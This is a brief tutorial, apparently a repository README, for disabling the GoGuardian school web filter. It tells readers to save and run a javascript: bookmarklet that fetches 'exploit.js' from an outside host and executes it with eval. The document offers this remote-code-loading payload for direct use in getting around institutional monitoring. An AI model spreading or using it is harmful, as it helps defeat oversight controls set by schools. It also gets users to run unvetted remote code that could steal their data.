# NoGuardian-the-easiest-GoGuardian-bypass.
Best and simplest goguardian bypass, no downloads.

The tutorial is very simple. 

You can go to the pastebin for the tutorial, or stay on this page. 

The easiest way to bypass GoGuardian. In fact, you disable it. Crazy, I know. Copy the script below, save it as a bookmark first, then paste it into your browsers address bar, you should see an error page that the page couldn't be found, that is when you use the bookmark. It will bring up a menu with switches, find the switch next to GoGuardian and click it to make it from blue to grey, you have disabled it. Simple script, only took me about 10 minutes to come up with.
 
javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
    
            Copy that.
